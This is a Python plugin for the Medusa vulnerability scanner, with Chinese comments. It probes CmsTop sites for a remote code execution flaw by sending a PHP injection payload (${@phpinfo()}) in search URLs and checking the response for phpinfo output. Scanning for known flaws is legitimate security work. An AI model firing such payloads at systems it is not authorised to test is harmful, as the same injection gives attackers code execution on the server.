#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
from ClassCongregation import UrlProcessing,VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling,Proxies

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['create_date'] = "2020-2-16"  # 插件编辑时间
        self.info['disclosure']='2014-03-27'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "CmsTopRemoteCodeExecution"  # 插件名称
        self.info['name'] ='CmsTop远程代码执行' #漏洞名称
        self.info['affects'] = "CmsTop"  # 漏洞组件
        self.info['desc_content'] = "CmsTop/domain.com/app/?,/app.domain.com/?存在远程代码执行漏洞。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port

    payload = "/app/?app=search&controller=index&id=$page&action=search&wd=a&test=${@phpinfo()}"
    payloadurl = scheme + "://" + url + ":" + str(port) + payload
    payload2 = "/?app=search&controller=index&id=$page&action=search&wd=a&test=${@phpinfo()}"
    domain_name = ".".join(url.split(".")[1:])
    payloadurl2 = scheme + "://app" + domain_name + ":" + str(port) + payload2
    Payloads = [payloadurl,payloadurl2]
    for payload_url in Payloads:
        try:
            headers = {
                'User-Agent': RandomAgent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
            }
            resp =requests.get(payload_url, headers=headers,proxies=proxies, timeout=6, verify=False)
            con = resp.text
            code = resp.status_code
            if code== 200 and con.find('PHP Version') != -1 and con.find('Configure Command') != -1 and con.find('System') != -1:
                Medusa = "{}存在CmsTop远程代码执行漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
                _t=VulnerabilityInfo(Medusa)
                VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
                WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果

        except Exception as e:
            _ = VulnerabilityInfo('').info.get('algroup')
            ErrorHandling().Outlier(e, _)
            _l =ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类